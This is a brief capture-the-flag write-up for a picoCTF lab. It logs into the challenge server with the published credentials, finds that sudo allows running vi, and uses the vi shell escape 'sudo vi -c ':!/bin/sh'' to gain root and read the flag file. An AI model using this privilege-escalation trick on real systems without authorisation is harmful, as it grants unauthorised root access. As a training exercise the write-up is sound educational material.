# Permissions
## Description
Can you read files in the root file?
The system admin has provisioned an account for you on the main server:
`ssh -p 52298 picoplayer@saturn.picoctf.net`
Password: `8nVVw6hmD7`
Can you login and read the root file?

## Solution
Lets start by logging into the server:
```bash
$ ssh -p 52298 picoplayer@saturn.picoctf.net
$ Password: 8nVVw6hmD7
```

Now that we are logged in, lets see if we can change into the root directory:
```bash
$ cd /root
```

Nope, we get an error. Lets see which permissions we have:
```bash
$ sudp -l
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
```

Interesting, we can run the `vi` command everywhere. Let's use this to spawn a shell! Using GTFobins, the following command can be used:
```bash
$ sudo vi -c ':!/bin/sh' /dev/null
```
And we are root!

Now that we are root, lets see the contents of the root directory:
```bash
$ cd /root
$ ls -la 
total 12
drwx------ 1 root root   23 Mar 16 02:29 .
drwxr-xr-x 1 root root   51 Apr 14 14:34 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Mar 16 02:29 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
```

We can see the a flag! Lets read it:
```bash
$ cat .flag.txt
picoCTF{[REDACTED]}
```
Just like that, we got the flag!
